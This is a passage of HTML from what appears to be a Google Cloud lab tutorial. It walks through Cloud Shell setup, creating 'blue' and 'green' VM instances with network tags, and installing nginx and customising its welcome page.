class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="https://cdn.qwiklabs.com/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-8'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>PROJECT_ID</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to "PROJECT_ID"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: "ACCOUNT"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = "PROJECT_ID"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h2 id='task-1-create-the-web-servers'><span>Task 1. Create the web servers</span></h2><p><span>In this section, you will create two web servers (</span><strong><span>blue</span></strong><span> and </span><strong><span>green</span></strong><span>) in the </span><strong><span>default</span></strong><span> VPC network. Then, you will install </span><strong><span>nginx</span></strong><span> on the web servers and modify the welcome page to distinguish the servers.</span></p><h3 id='create-the-blue-server'><strong><span>Create the blue server</span></strong></h3><p><span>Create the </span><strong><span>blue</span></strong><span> server with a network tag.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>To create a new instance, click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>.</span></p><p><span>Select the following values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>blue</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>ZONE</code></td></tr></tbody></table></figure><p><span>For more information on available regions and zones, in the Google Cloud Compute Engine Region and Zone guide, see </span><a href='https://cloud.google.com/compute/docs/regions-zones/#available'><span>the Available regions and zones section of the Compute Engine Guides</span></a><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p><ul><li><p><span>For </span><strong><span>Network tags</span></strong><span>, type </span><code>web-server</code><span>.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Networks use network tags to identify which VM instances are subject to certain firewall rules and network routes. Later in this lab, you create a firewall rule to allow HTTP access for VM instances with the </span><strong><span>web-server</span></strong><span> tag. Alternatively, you could check the </span><strong><span>Allow HTTP traffic</span></strong><span> checkbox, which would tag this instance as </span><strong><span>http-server</span></strong><span> and create the tagged firewall rule for tcp:80 for you.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='test-completed-task-15'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have completed the task successfully you will be granted an assessment score.</span></p><p><span>Create the blue server.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='create-the-green-server'><strong><span>Create the green server</span></strong></h3><p><span>Create the </span><strong><span>green</span></strong><span> server without a network tag.</span></p><ol start='' ><li><p><span>Still in the Console, on the </span><strong><span>VM instances</span></strong><span> page, click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>.</span></p><p><span>Select the following values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>green</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>ZONE</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='test-completed-task-16'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have completed the task successfully you will be granted an assessment score.</span></p><p><span>Create the green server.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='install-nginx-and-customize-the-welcome-page'><strong><span>Install nginx and customize the welcome page</span></strong></h3><p><span>Install nginx on both VM instances and modify the welcome page to distinguish the servers.</span></p><ol start='' ><li><p><span>Still in the </span><strong><span>VM instances</span></strong><span> dialog, for </span><strong><span>blue</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>In the SSH terminal to blue, run the following command to install nginx:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install nginx-light -y</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Open the welcome page in the nano editor:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo nano /var/www/html/index.nginx-debian.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Replace the </span><code>&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</code><span> line with </span><code>&lt;h1&gt;Welcome to the blue server!&lt;/h1&gt;</code><span>.</span></p></li><li><p><span>Press </span><strong><span>CTRL+o</span></strong><span>, </span><strong><span>ENTER</span></strong><span>, </span><strong><span>CTRL+x</span></strong><span>.</span></p></li><li><p><span>Verify the change:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat /var/www/html/index.nginx-debian.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should contain the following:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Welcome to the blue server!&lt;/h1&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">working. Further configuration is required.&lt;/p&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>Close the SSH terminal to </span><strong><span>blue</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Repeat the same steps for the </span><strong><span>green</span></strong><span> server:</span></p><ol start='' ><li><p><span>For </span><strong><span>green</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>Install nginx:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install nginx-light -y</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Open the welcome page in the nano editor:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo nano /var/www/html/index.nginx-debian.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Replace the </span><code>&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</code><span> line with </span><code>&lt;h1&gt;Welcome to the green server!&lt;/h1&gt;</code><span>.</span></p></li><li><p><span>Press </span><strong><span>CTRL+o</span></strong><span>, </span><strong><span>ENTER</span></strong><span>, </span><strong><span>CTRL+x</span></strong><span>.</span></p></li><li><p><span>Verify the change:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror 